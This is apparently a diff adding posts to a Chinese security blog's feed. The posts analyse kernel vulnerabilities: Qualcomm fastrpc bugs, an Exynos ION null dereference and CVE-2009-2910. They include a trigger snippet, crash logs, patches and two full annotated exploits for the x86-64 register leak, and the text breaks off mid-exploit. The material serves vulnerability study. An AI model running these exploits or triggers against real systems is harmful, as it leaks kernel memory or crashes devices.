+<pre><code class="language-c">int main() {
+  printf(&quot;calling ioctl\n&quot;);
+  struct fastrpc_ioctl_dspsignal_wait arg = {
+    .signal_id = 1024/*too big*/
+  };
+  int ret = ioctl(3,COMPAT_FASTRPC_IOCTL_DSPSIGNAL_WAIT,&amp;arg); // [3] 进程 B 调用 32 位的 `ioctl` 接口（从而设置了 `is_compat` 标志）并退出。
+  printf(&quot;ioctl returned %d (%m)\n&quot;, ret);
+  return 0;
+}
+</code></pre>
+<h1 id="patch">Patch</h1>
+<ol>
+<li>定义了一个enum <code>fastrpc_msg_type</code>，去除了结构体<code>fastrpc_file</code>里的<code>is_compat</code>（把这个flag的“全局”级别降低了）。</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://lzxzl.github.io/post-images/1735233467178.png" alt="" loading="lazy"></figure>
+<ol start="2">
+<li>
+<p>既然去除了结构体<code>fastrpc_file</code>里的<code>is_compat</code>，那么在c文件里用到的地方也要去掉。比如下面978行去掉了这个字段的设置，而是通过<code>fastrpc_msg_type</code>来设置。</p>
+</li>
+<li>
+<p>32 位兼容层的ioctl中，invoke和invoke2分别做了改变：350行的参数从<code>USER_MSG</code>换成了<code>COMPAT_MSG</code>，从上面的注释来看，前者表示64位，后者表示32位；487行给invoke2函数加了一个参数true，来表示是兼容层。</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://lzxzl.github.io/post-images/1735233490773.png" alt="" loading="lazy"></figure>
+<ol start="4">
+<li>上面兼容层最后会调用64位的函数。</li>
+</ol>
+<ul>
+<li>对于invoke：如果是<code>COMPAT_MSG</code>，则kernel设置为<code>USER_MSG</code>，否则是原值。这里的意思是如果是兼容层传过来的，因为在兼容层已经完成了数据类型的转换，所以这里就把类型改过来，直接当64位的了。</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://lzxzl.github.io/post-images/1735233504595.png" alt="" loading="lazy"></figure>
+<p>3401行调用了<code>context_alloc</code>函数：</p>
+<figure data-type="image" tabindex="4"><img src="https://lzxzl.github.io/post-images/1735233516726.png" alt="" loading="lazy"></figure>
+<ul>
+<li>对于invoke2：不再用<code>fl-&gt;is_compat</code>，而是用传入的参数<code>is_compat</code>（传入true）</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://lzxzl.github.io/post-images/1735233527874.png" alt="" loading="lazy"></figure>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html</li>
+<li>https://project-zero.issues.chromium.org/issues/42451710</li>
+<li>https://docs.qualcomm.com/product/publicresources/securitybulletin/october-2024-bulletin.html</li>
+<li>https://git.codelinaro.org/clo/la/platform/vendor/qcom/opensource/dsp-kernel/-/commit/c60ac212aabd299304dfbb54b1fc18c59247d9ae</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2024-38402 refcount leak leading to UAF in fastrpc_get_process_gids]]></title>
+        <id>https://lzxzl.github.io/post/cve-2024-38402-refcount-leak-leading-to-uaf-in-fastrpc_get_process_gids/</id>
+        <link href="https://lzxzl.github.io/post/cve-2024-38402-refcount-leak-leading-to-uaf-in-fastrpc_get_process_gids/">
+        </link>
+        <updated>2024-12-24T15:20:50.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>qualcomm-dsp-driver: adsprpc</p>
+</blockquote>
+<p>该漏洞是与task相关联的 <code>group_info</code> 结构体的引用计数泄漏导致的UAF。在 <code>fastrpc_get_process_gids</code> 函数中，调用了 <code>get_current_groups</code>，它会增加 <code>group_info</code> 结构体的引用计数，但该引用计数从未被减1。此外，这个引用计数是一个<strong>非饱和引用计数</strong>（non-saturating refcount），这意味着如果你大约调用 <code>fastrpc_get_process_gids</code> <strong>2^32 次</strong>，就有可能发生溢出。</p>
+<p>尽管在实际中很难利用这个漏洞（触发这个错误至少需要 14 个小时），但它仍然是一次<strong>内存损坏</strong>，并可能导致其相关的后果。下面是由该问题引发的示例崩溃日志。日志显示了一个无效内存读错误（Invalid read），读取地址是 <code>0xffffff89572a0000</code>，这是因为 <code>group_info</code> 的内存已经被释放，但仍被访问。</p>
+<pre><code>[77306.174599] [7:           adbd: 5455] BUG: KFENCE: invalid read in groups_to_user+0x34/0x1a4 
+
+[77306.174606] [7:           adbd: 5455] Invalid read at 0xffffff89572a0000:   &lt;-- uaf 读
+
+[77306.174607] [7:           adbd: 5455]  groups_to_user+0x34/0x1a4 
+
+[77306.174609] [7:           adbd: 5455]  invoke_syscall+0x58/0x13c 
+
+[77306.174612] [7:           adbd: 5455]  el0_svc_common+0xb4/0xf0 
+
+[77306.174614] [7:           adbd: 5455]  do_el0_svc+0x24/0x90 
+
+[77306.174615] [7:           adbd: 5455]  el0_svc+0x20/0x7c 
+
+[77306.174617] [7:           adbd: 5455]  el0t_64_sync_handler+0x84/0xe4 
+
+[77306.174618] [7:           adbd: 5455]  el0t_64_sync+0x1b8/0x1bc 
+
+[77306.174620] [7:           adbd: 5455]   
+
+[77306.174621] [7:           adbd: 5455] CPU: 7 PID: 5455 Comm: adbd Tainted: G S      W  OE     5.15.123-android13-8-28577312-abS911BXXU3CXD3 #1 
+
+[77306.174623] [7:           adbd: 5455] Hardware name: Samsung DM1Q PROJECT (board-id,13) (DT) 
+
+[77306.174624] [7:           adbd: 5455] pstate: 22400005 (nzCv daif +PAN -UAO +TCO -DIT -SSBS BTYPE=--) 
+
+[77306.174626] [7:           adbd: 5455] pc : groups_to_user+0x34/0x1a4 
+
+[77306.174628] [7:           adbd: 5455] lr : __arm64_sys_getgroups+0x4c/0x6c 
+
+[77306.174629] [7:           adbd: 5455] sp : ffffffc02a073e00 
+
+[77306.174630] [7:           adbd: 5455] x29: ffffffc02a073e00 x28: ffffff8868030040 x27: 0000000000000000 
+
+[77306.174633] [7:           adbd: 5455] x26: 0000000000000000 x25: 0000000000000000 x24: 0000000000000000 
+
+[77306.174635] [7:           adbd: 5455] x23: 0000000060001000 x22: 00000077219a4f2c x21: ffffff8868030040 
+
+[77306.174637] [7:           adbd: 5455] x20: ffffffc0081bd46c x19: 000000006b6b6b6b x18: ffffffc016089000 
+
+[77306.174638] [7:           adbd: 5455] x17: 000000000000fffe x16: b4000074e392f638 x15: ffffff895729fff8 
+
+[77306.174640] [7:           adbd: 5455] x14: 00000000524e68f8 x13: ffffff8868030040 x12: ffffffc00ad82000 
+
+[77306.174641] [7:           adbd: 5455] x11: 0000007fffffffff x10: ffffffc00aa93000 x9 : 0000000014939a3e 
+
+[77306.174643] [7:           adbd: 5455] x8 : 000000006b6b6b6b x7 : 0000000000000000 x6 : 0000000000000000 
+
+[77306.174645] [7:           adbd: 5455] x5 : 0000000000000000 x4 : 0000000000000000 x3 : 0000000000000000 
+
+[77306.174646] [7:           adbd: 5455] x2 : 0000000000000040 x1 : ffffff8904db9700 x0 : b400007491448d40 
+
+[77306.174648] [7:           adbd: 5455] Call trace: 
+
+[77306.174648] [7:           adbd: 5455]  groups_to_user+0x34/0x1a4 
+
+[77306.174650] [7:           adbd: 5455]  invoke_syscall+0x58/0x13c 
+
+[77306.174651] [7:           adbd: 5455]  el0_svc_common+0xb4/0xf0 
+
+[77306.174653] [7:           adbd: 5455]  do_el0_svc+0x24/0x90 
+
+[77306.174654] [7:           adbd: 5455]  el0_svc+0x20/0x7c 
+
+[77306.174655] [7:           adbd: 5455]  el0t_64_sync_handler+0x84/0xe4 
+
+[77306.174656] [7:           adbd: 5455]  el0t_64_sync+0x1b8/0x1bc
+</code></pre>
+<p>漏洞代码和patch如下：</p>
+<pre><code class="language-c">
+static int fastrpc_get_process_gids(struct gid_list *gidlist)
+{
+-	struct group_info *group_info = get_current_groups(); // 只加，但没地方减
++	struct group_info *group_info = current_cred()-&gt;group_info;
+	int i = 0, err = 0, num_gids = group_info-&gt;ngroups + 1;
+	unsigned int *gids = NULL;
+
+	gids = kcalloc(num_gids, sizeof(unsigned int), GFP_KERNEL);
+	if (!gids) {
+		err = -ENOMEM;
+		goto bail;
+	}
+
+	/* Get the real GID */
+	gids[0] = __kgid_val(current_gid());
+
+	/* Get the supplemental GIDs */
+	for (i = 1; i &lt; num_gids; i++)
+		gids[i] = __kgid_val(group_info-&gt;gid[i - 1]);
+
+	sort(gids, num_gids, sizeof(*gids), uint_cmp_func, NULL);
+	gidlist-&gt;gids = gids;
+	gidlist-&gt;gidcount = num_gids;
+bail:
+	if (err)
+		kfree(gids);
+	return err;
+}
+
+</code></pre>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html</li>
+<li>https://project-zero.issues.chromium.org/issues/42451711</li>
+<li>https://git.codelinaro.org/clo/la/kernel/msm-5.15</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2021-25458 Kernel NULL Pointer Dereference in Exynos ION Implementation]]></title>
+        <id>https://lzxzl.github.io/post/cve-2021-25458-kernel-null-pointer-dereference-in-exynos-ion-implementation/</id>
+        <link href="https://lzxzl.github.io/post/cve-2021-25458-kernel-null-pointer-dereference-in-exynos-ion-implementation/">
+        </link>
+        <updated>2024-12-24T14:29:18.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>https://labs.taszk.io/blog/post/60_ss_ion_null_deref/</p>
+</blockquote>
+<p>Exynos ION内核驱动程序中存在一个ION内存缓冲区类型混淆漏洞。该漏洞可能导致将未初始化的内存视为有效指针，并导致内核空指针异常。untrusted app可以利用此漏洞导致内核崩溃。</p>
+<p>函数<code>ion_iovmm_map</code>用于将ion缓冲区映射到总线的io地址空间，使其可用于支持dma的外部设备，并返回此dma地址。<br>
+但是呢，这个函数里有一个获取dma地址的“快速路径“：如果传入的参数attachment里有buffer，而且这个buffer带值为<code>ION_FLAG_PROTECTED</code>的flag，那么就从这个buffer里取关联的、预初始化的<code>prot-&gt;dma_addr</code>指针。</p>
+<pre><code class="language-c">// drivers/staging/android/ion/ion_exynos.c
+
+dma_addr_t ion_iovmm_map(struct dma_buf_attachment *attachment,
+       off_t offset, size_t size,
+       enum dma_data_direction direction, int prop)
+{
+  struct ion_buffer *buffer = attachment-&gt;dmabuf-&gt;priv;
+  dma_addr_t iova;
+
+  // 如果这个buffer带了flag ION_FLAG_PROTECTED
+  if (IS_ENABLED(CONFIG_EXYNOS_CONTENT_PATH_PROTECTION) &amp;&amp;
+      (buffer-&gt;flags &amp; ION_FLAG_PROTECTED)) {
+    // 1. 这可能是一个未初始化的指针
+    struct ion_buffer_prot_info *prot = buffer-&gt;priv_virt;
+
+    // 2. 对其进行解引用,并返回读取的值
+    iova = prot-&gt;dma_addr;
+  } else {
+    iova = __ion_iovmm_map(attachment, offset, size,
+               direction, prop);
+  }
+
+  return iova;
+}
+</code></pre>
+<p>这种优化是基于这样一种假设：要么ion分配器为受保护的缓冲区初始化buffer的<code>priv_virt</code>指针，要么不允许使用这个标志。这个假设对大多数堆实现来说是正确的，只有所谓的rbin堆除外。从<code>ION_HEAP_TYPE_CUSTOM2</code>堆分配的任何ion缓冲区都使用这个分配器。rbin堆分配器(在<code>drivers/staging/android/ion/ion_rbin_heap.c</code>中的<code>ion_rbin_heap_allocate</code>)只是简单地忽略这个标志，但它从不初始化<code>priv_virt</code>指针。</p>
+<p>因此，如果将从rbin堆分配的ion缓冲区传递给<code>ion_iovmm_map</code>函数，它就会使用未初始化的<code>priv_virt</code>指针。尽管<code>ion_iovmm_map</code>没有直接暴露给用户空间，但内核中有不同的驱动程序将用户提供的ion缓冲区传递给这个函数。</p>
+<p>原作者已经静态验证了这样的调用链存在于以下设备的内核中：</p>
+<ul>
+<li><code>/dev/vertex10</code>: <code>npu_memory_map</code> -&gt; <code>ion_iovmm_map</code></li>
+<li><code>/dev/tsmux</code>: <code>tsmux_ioctl</code> -&gt; <code>tsmux_ioctl_m2m_map_buf</code> -&gt; <code>ion_iovmm_map</code></li>
+<li><code>/dev/g2d</code> <code>/dev/fimg2d</code>: <code>g2d_ioctl</code> -&gt; … -&gt; <code>g2d_get_dmabuf</code> -&gt; <code>ion_iovmm_map</code></li>
+<li><code>/dev/dsp</code>: <code>dsp_ioctl</code> -&gt; … -&gt; <code>dsp_memory_map_buffer</code> -&gt; <code>ion_iovmm_map</code></li>
+<li><code>/dev/m2m1shot_scaler0</code>: <code>m2m1shot_ioctl</code> -&gt; … -&gt; <code>m2m1shot_dma_addr_map</code> -&gt; <code>ion_iovmm_map</code></li>
+<li><code>/dev/jsqz</code>: <code>jsqz_ioctl</code> -&gt; … -&gt; <code>jsqz_dma_addr_map</code> -&gt; <code>ion_iovmm_map</code></li>
+<li>...</li>
+</ul>
+<p>虽然对这些设备驱动的访问在不同程度上受到selinux的限制，但它们一起提供了相当大的攻击面。最值得注意的是/dev/dsp。这个节点具有<code>vendor_dsp_device</code>标签，并且暴露给相当多的非特权selinux上下文，包括不受信任的应用程序。/dev/ion设备具有<code>ion_device selinux</code>标签，这是限制最少的selinux类型之一，它也可供不受信任的应用程序使用。</p>
+<p>因此，untrusted app可以从rbin堆中分配一个ion缓冲区，并将其传递给/dev/dsp设备。该设备将尝试访问未初始化的内核指针，在这种情况下，这将在内核内部导致空指针解引用，并随后导致内核panic。</p>
+<p><strong>总结</strong>：三星自己实现的<code>ion_iovmm_map</code>函数里，有两条路径来映射io内存，一个是正常的mmap，另一个fast path直接从参数里取protected buffer。按设计来说，所有ion分配器在分配protected buffer的时候，都要初始化它的<code>priv_virt</code>指针。但是有一个<code>rbin</code>堆分配器没有初始化，导致在<code>ion_iovmm_map</code>函数里取出来之后用的时候发生空指针解引用。</p>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://labs.taszk.io/blog/post/60_ss_ion_null_deref/</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2009-2910-Linux Kernel x86-64 Register Leak by Jon Oberheide]]></title>
+        <id>https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/</id>
+        <link href="https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/">
+        </link>
+        <updated>2024-05-06T17:54:11.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<blockquote>
+<p>versions &lt;= 2.6.32-rc1</p>
+</blockquote>
+<p>The x86-64 registers r8-r11 may be leaked to 32-bit unprivileged userspace applications that switch themselves into 64-bit mode.</p>
+<p>x86-64 架构（又称为 amd64）中的 r8 到 r11 寄存器的内容可能会泄露给切换到 64 位模式的 32 位非特权用户空间应用程序。</p>
+<p>x86-64 的一个关键设计决策是其与 32 位代码的向后兼容性：</p>
+<ul>
+<li>在 x86-64 的长模式下，有两种由代码段描述符控制的子模式：兼容模式和 64 位模式。</li>
+<li>因此，64 位操作系统可以毫无问题地执行 32 位和 64 位二进制文件。</li>
+<li>当然，如果我们正在执行一个 32 位二进制文件，我们可以访问传统的 32 位架构寄存器，而不是 x86-64 增加的额外寄存器文件。</li>
+</ul>
+<p>然而，可以在单个可执行文件中混合使用 32 位和 64 位代码：</p>
+<ul>
+<li>一个 32 位进程可以切换到 64 位模式，并直接跳转到 x86-64 机器代码。</li>
+<li>一个 64 位进程能够调用 32 位系统调用。</li>
+</ul>
+<p>这种模式切换可以被滥用，正如 <a href="http://scary.beasts.org/security/CESA-2009-001.html">Chris Evans 发现的那样</a>（因为 32 位和 64 位的系统调用编号不同），绕过系统调用过滤机制（syscall filtering mechanisms），从而实现对敏感信息的泄露。</p>
+<p>下面这个漏洞就是在这种情况下被利用的，在 32 位和 64 位代码之间切换时发生信息泄漏。</p>
+<blockquote>
+<p>syscall filtering mechanisms：好吧，其实应该就是系统调用的访问控制</p>
+<ul>
+<li>主要目的：限制应用程序可以执行的系统调用类型。
+<ul>
+<li>这对于增强系统的安全性至关重要，尤其是在多租户环境、容器化部署或任何需要细粒度安全控制的场景中。</li>
+<li>过滤机制可以帮助防止恶意软件或者滥用资源，限制了潜在的攻击面。</li>
+</ul>
+</li>
+<li>实现：
+<ul>
+<li><strong>seccomp（Secure Computing Mode）</strong>：允许进程指定一个简单的过滤器，这个过滤器定义了哪些系统调用是允许的，哪些是被禁止的。这种模式有两个级别：
+<ul>
+<li><strong>seccomp 模式 1</strong>：这是一种较为严格的过滤模式，只允许四个系统调用：<code>read()</code>, <code>write()</code>, <code>_exit()</code>, 和 <code>sigreturn()</code>。这对于非常受限的环境非常有用。</li>
+<li><strong>seccomp 模式 2</strong>：提供了更灵活的过滤能力，允许进程定义一个过滤器，该过滤器使用 Berkeley Packet Filter（BPF）语法，可以精确地指定允许和禁止的系统调用列表，甚至可以根据调用的参数来决定是否允许。</li>
+</ul>
+</li>
+<li><strong>AppArmor 和 SELinux</strong>：这些是更为复杂的安全模块，它们提供了基于角色的访问控制（RBAC）和强制访问控制（MAC）策略，这些策略可以控制进程对系统调用的访问。这些工具通过定义安全策略来限制应用程序可以执行的系统调用，以及它们可以访问的文件和网络资源。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h1 id="the-vulnerability">The Vulnerability</h1>
+<p>从系统调用返回时，未将几个 x86-64 寄存器清零（特别是 r8 到 r11）。一个 32 位应用程序可能能切换到 64 位模式，并访问 r8、r9、r10 和 r11 寄存器，从而泄露它们之前的值。这个问题由[] Jan Beulich 发现](http://lkml.org/lkml/2009/10/1/164)。</p>
+<p>修复方法是在系统调用返回时通过执行 XOR 操作将 r8 到 r11 寄存器清零，即 <code>xorq %rx,%rx</code>。这样可以确保这些寄存器的内容在返回到用户空间前不会保留任何敏感信息。</p>
+<pre><code class="language-assembly">diff --git a/arch/x86/ia32/ia32entry.S b/arch/x86/ia32/ia32entry.S
+--- a/arch/x86/ia32/ia32entry.S
++++ b/arch/x86/ia32/ia32entry.S
+@@ -172,6 +172,10 @@ sysexit_from_sys_call:
+        movl    RIP-R11(%rsp),%edx              /* User %eip */
+        CFI_REGISTER rip,rdx
+        RESTORE_ARGS 1,24,1,1,1,1
++       xorq    %r8,%r8
++       xorq    %r9,%r9
++       xorq    %r10,%r10
++       xorq    %r11,%r11
+        popfq
+        CFI_ADJUST_CFA_OFFSET -8
+        /*CFI_RESTORE rflags*/
+</code></pre>
+<h1 id="the-exploit">The Exploit</h1>
+<p>核心思想：编写一个32 位用户空间应用程序，同时让他切换到 64 位模式，以便访问 x86-64 寄存器并暴露泄露的信息。</p>
+<p>为了将32 位和 64 位代码混合，使用 <code>-m32</code> 编译二进制文件，但使用 gcc 的内联汇编来混合必要的 64 位代码，而不会产生冲突。为了切换到 64 位模式，只需要执行一个带有 <code>USER_CS</code> 代码段（在 Linux 上是 0x33）的 <code>ljmp/lcall</code>：</p>
+<blockquote>
+<p><code>ljmp</code> 指令是长跳转，用于改变控制流同时切换代码段寄存器，这里将代码段寄存器设置为 0x33，即 x86-64 下的用户空间代码段，从而切换到 64 位模式。</p>
+</blockquote>
+<pre><code class="language-assembly">.code32
+ljmp $0x33, $1f
+.code64
+1:
+/* 64-bit code here */
+xorq %rax, %rax
+...
+</code></pre>
+<p>对于 64 位寄存器 r8、r9、r10 和 r11，简单地将 64 位压缩到两个 32 位的通用寄存器中。例如，将 r8 的上下 32 位分别放入 rax 和 rcx（稍后通过 eax 和 ecx 检索）</p>
+<pre><code class="language-assembly">movq %r8, %rcx
+shr $32, %r8
+movq %r8, %rax
+</code></pre>
+<p>最后，为了检索泄露的值，跳转到一个无效地址（0xdeadbeef）引发 SIGSEGV，然后在 gdb 中使用 <code>info regs</code> 来检查寄存器的值。</p>
+<pre><code class="language-sh">$ gcc -m32 x86_64-reg-leak.c -o x86_64-reg-leak
+$ gdb ./x86_64-reg-leak
+GNU gdb 6.8-debian
+...
+(gdb) run
+[+] Switching to x86_64 long mode via far jmp...
+...
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+(gdb) info reg
+eax            0xffff8800       -30720        &lt;-- r8 上半部
+ecx            0xa5cc6000       -1513332736   &lt;-- r8 下半部
+edx            0x0      0                     &lt;-- r9 上半部
+ebx            0x1      1                     &lt;-- r9 下半部
+esp            0xffff8800       0xffff8800    &lt;-- r10 上半部
+ebp            0xa5cc6000       0xa5cc6000    &lt;-- r10 下半部
+esi            0x0      0                     &lt;-- r11 上半部
+edi            0xffffffff       -1            &lt;-- r11 下半部
+...
+</code></pre>
+<h2 id="exp1">Exp1</h2>
+<pre><code class="language-c">/* 
+ * x86_64-reg-leak.c
+ *
+ * Linux Kernel &lt;= 2.6.32-rc1 x86_64 Register Leak
+ * Jon Oberheide &lt;jon@oberheide.org&gt;
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ * 
+ *   http://lkml.org/lkml/2009/10/1/164
+ *   
+ *   While 32-bit processes can't directly access R8...R15, they can gain 
+ *   access to these registers by temporarily switching themselves into 64-bit
+ *   mode.
+ *
+ * Usage:
+ *
+ *   $ gcc -m32 x86_64-reg-leak.c -o x86_64-reg-leak
+ *   $ gdb ./x86_64-reg-leak
+ *   GNU gdb 6.8-debian
+ *   ...
+ *   (gdb) run
+ *   [+] Switching to x86_64 long mode via far jmp...
+ *   ...
+ *   Program received signal SIGSEGV, Segmentation fault.
+ *   0xdeadbeef in ?? ()
+ *   (gdb) info reg
+ *   eax            0xffff8800       -30720        &lt;-- r8 upper
+ *   ecx            0xa5cc6000       -1513332736   &lt;-- r8 lower
+ *   edx            0x0      0                     &lt;-- r9 upper
+ *   ebx            0x1      1                     &lt;-- r9 lower
+ *   esp            0xffff8800       0xffff8800    &lt;-- r10 upper
+ *   ebp            0xa5cc6000       0xa5cc6000    &lt;-- r10 lower
+ *   esi            0x0      0                     &lt;-- r11 upper
+ *   edi            0xffffffff       -1            &lt;-- r11 lower
+ *   ...
+ *
+ * Notes:
+ * 
+ *   We switch from x86_64 compat mode to long mode via our far jmp and 
+ *   then dump out r8-r11 through our 32-bit GPRs and then segfault for 
+ *   register inspection via GDB.
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+// 定义了用户代码段和数据段的选择子，用于后面在汇编代码中指定
+#define USER_CS       &quot;0x33&quot;
+#define USER_DS       &quot;0x2b&quot;
+
+int
+main(void)
+{
+	int ret;
+
+	printf(&quot;[+] Switching to x86_64 long mode via far jmp...\n\n&quot;);
+
+  // 睡眠 8s 多
+	for (ret = 5; ret &gt; 0; ret--) {
+		printf(&quot;%d...\n&quot;, ret);
+		sleep(1);
+	}
+	printf(&quot;\n&quot;);
+
+	sleep(3);
+
+	asm volatile (
+		&quot;	.code32				\n&quot;                       // .code32 指示接下来的代码是32位
+		&quot;	ljmp $&quot; USER_CS &quot;, $1f		\n&quot;           // ljmp 是远跳转指令，用于切换到64位模式。目标是标签 1f，即代码中的 1: 标签。
+		&quot;					\n&quot;
+		&quot;	.code64				\n&quot;                       // .code64 指示接下来的代码是64位
+		&quot;	1:				\n&quot;
+		&quot;	movl $&quot; USER_DS &quot;, %%eax	\n&quot;           // 将数据段选择子加载到寄存器 eax，然后设置数据段（ds）、栈段（ss）和附加段（es）寄存器。
+		&quot;	movl %%eax, %%ds		\n&quot;
+		&quot;	movl %%eax, %%ss		\n&quot;
+		&quot;	movl %%eax, %%es		\n&quot;
+		&quot;					\n&quot;
+		&quot;	movq %%r8, %%rcx		\n&quot;                 // 将 r8 寄存器的内容复制到 rcx
+		&quot;	shr $32, %%r8			\n&quot;                   // 将 r8 右移32位，把高32位移至低32位位置
+		&quot;	movq %%r8, %%rax		\n&quot;                 // 将修改后的 r8 复制到 rax
+		&quot;					\n&quot;
+		&quot;	movq %%r9, %%rbx		\n&quot;                 // 这个模式对 r9, r10, r11 也重复执行，分别操作 rbx, rdx, rbp, rsp, rdi, rsi
+		&quot;	shr $32, %%r9			\n&quot;
+		&quot;	movq %%r9, %%rdx		\n&quot;
+		&quot;					\n&quot;
+		&quot;	movq %%r10, %%rbp		\n&quot;
+		&quot;	shr $32, %%r10			\n&quot;
+		&quot;	movq %%r10, %%rsp		\n&quot;
+		&quot;					\n&quot;
+		&quot;	movq %%r11, %%rdi		\n&quot;
+		&quot;	shr $32, %%r11			\n&quot;
+		&quot;	movq %%r11, %%rsi		\n&quot;
+		&quot;					\n&quot;
+		&quot;	.code32				\n&quot;                       // 回到32位代码模式
+		&quot;	jmp 0xdeadbeef			\n&quot;                 // 执行一个跳转到无效地址 0xdeadbeef 的指令，这通常会导致程序异常终止（例如访问违规）
+		::
+	);
+
+	return 0;
+}
+</code></pre>
+<h2 id="为什么code32-能指示接下来的代码是32位">为什么.code32 能指示接下来的代码是32位？</h2>
+<p>在汇编语言中，指令 <code>.code32</code> 和 <code>.code64</code> 是由汇编器提供的伪指令（pseudo-instructions），它们用来指定接下来的代码应该按照哪种体系结构（32位或64位）来解释和编译。这些伪指令不直接转换为机器代码，而是用来影响汇编器的行为。下面解释了为什么和如何 <code>.code32</code> 能够指示汇编器编译32位代码：</p>
+<h3 id="汇编器的模式控制">汇编器的模式控制</h3>
+<p>汇编器，如 GNU Assembler (GAS)，需要知道汇编代码应该被如何处理：是作为32位代码还是64位代码。这影响了指令的编码、可用的指令集、以及寄存器的名字和功能。</p>
+<ul>
+<li><strong>指令长度和格式</strong>: 32位和64位模式下，某些指令的编码长度和格式可能不同。例如，64位模式支持更长的地址和偏移量。</li>
+<li><strong>可用指令</strong>: 64位模式可能支持一些32位模式中不可用的扩展指令，例如操作64位寄存器的指令。</li>
+<li><strong>寄存器</strong>: 64位模式引入了更多的寄存器和扩展了现有的寄存器（例如，32位的 <code>eax</code> 寄存器在64位中扩展为 <code>rax</code>）。</li>
+</ul>
+<h3 id="指示汇编器的目标体系结构">指示汇编器的目标体系结构</h3>
+<p>当写入 <code>.code32</code> 或 <code>.code64</code> 时，告诉汇编器接下来的汇编指令应该按照32位或64位体系结构来处理。这是必要的，特别是在编写涉及多种处理模式的代码时（如在操作系统或低级系统软件中常见）。</p>
+<p>例如，在代码中：</p>
+<pre><code class="language-assembly">.code32
+ljmp $USER_CS, $1f
+</code></pre>
+<p>这里 <code>.code32</code> 告诉汇编器，接下来的 <code>ljmp</code> 指令应该按照32位模式来编译。而 <code>ljmp</code> （远跳转）可能用于从32位模式切换到64位模式（通过设置正确的代码段寄存器）。</p>
+<h2 id="exp2">exp2</h2>
+<p><strong>spender 也同时编写了一个exp，内容如下所示。它将循环调用一系列随机的系统调用，并打印泄露的数据，这样就不必使用 gdb。</strong></p>
+<pre><code class="language-c">/* written by Ingo Molnar -- it's true because this comment says the exploit
+   was written by him!
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/syscall.h&gt;
+
+// 这些变量用于存储从64位寄存器分割为32位部分后的值。
+unsigned int _r81; 
+unsigned int _r82;
+unsigned int _r91;
+unsigned int _r92;
+unsigned int _r101;
+unsigned int _r102;
+unsigned int _r111;
+unsigned int _r112;
+unsigned int _r121;
+unsigned int _r122;
+unsigned int _r131;
+unsigned int _r132;
+unsigned int _r141;
+unsigned int _r142;
+unsigned int _r151;
+unsigned int _r152;
+
+// 通过从32位模式（code32）转换到64位模式（code64）并返回，从64位寄存器中提取值并将它们存储到全局变量中
+int leak_it(void)
+{
+	asm volatile (
+	&quot;.intel_syntax noprefix\n&quot;      // 指定使用Intel语法进行汇编代码
+	&quot;.code32\n&quot; 										// 表明接下来的汇编代码应被视为32位
+	&quot;jmp label1\n&quot;									// 跳转到标签label1，这是第一个远调用序列的开始
+	&quot;farcalllabel1:\n&quot;							// 用于处理从32位到64位的远调用
+	&quot;.code64\n&quot;											// 切换到64位模式
+	&quot;mov eax, r8d\n&quot;                // 这些指令将64位寄存器的低32位移动到32位寄存器（eax、ebx等），然后将高32位移动到寄存器的低半部分以读取它们
+	&quot;shr r8, 32\n&quot;
+	&quot;mov ebx, r8d\n&quot;
+	&quot;mov ecx, r9d\n&quot;
+	&quot;shr r9, 32\n&quot;
+	&quot;mov edx, r9d\n&quot;
+	&quot;mov esi, r10d\n&quot;
+	&quot;shr r10, 32\n&quot;
+	&quot;mov edi, r10d\n&quot;
+	&quot;.att_syntax noprefix\n&quot;				// 转换为AT&amp;T语法，通常在GNU汇编器中使用。这里用于切换回AT&amp;T语法进行长返回（lret）指令，该指令用于从调用返回
+	&quot;lret\n&quot;
+	&quot;.intel_syntax noprefix\n&quot;
+	&quot;farcalllabel2:\n&quot;
+	&quot;mov eax, r11d\n&quot;
+	&quot;shr r11, 32\n&quot;
+	&quot;mov ebx, r11d\n&quot;
+	&quot;mov ecx, r12d\n&quot;
+	&quot;shr r12, 32\n&quot;
+	&quot;mov edx, r12d\n&quot;
+	&quot;mov esi, r13d\n&quot;
+	&quot;shr r13, 32\n&quot;
+	&quot;mov edi, r13d\n&quot;
+	&quot;.att_syntax noprefix\n&quot;
+	&quot;lret\n&quot;
+	&quot;.intel_syntax noprefix\n&quot;
+	&quot;farcalllabel3:\n&quot;
+	&quot;mov eax, r14d\n&quot;
+	&quot;shr r14, 32\n&quot;
+	&quot;mov ebx, r14d\n&quot;
+	&quot;mov ecx, r15d\n&quot;
+	&quot;shr r15, 32\n&quot;
+	&quot;mov edx, r15d\n&quot;
+	&quot;.att_syntax noprefix\n&quot;
+	&quot;lret\n&quot;
+	&quot;.intel_syntax noprefix\n&quot;
+	&quot;.code32\n&quot;
+	&quot;label1:\n&quot;
+	&quot;.att_syntax noprefix\n&quot;
+	&quot;lcall $0x33, $farcalllabel1\n&quot;
+	&quot;.intel_syntax noprefix\n&quot;
+	&quot;mov _r81, eax\n&quot;
+	&quot;mov _r82, ebx\n&quot;
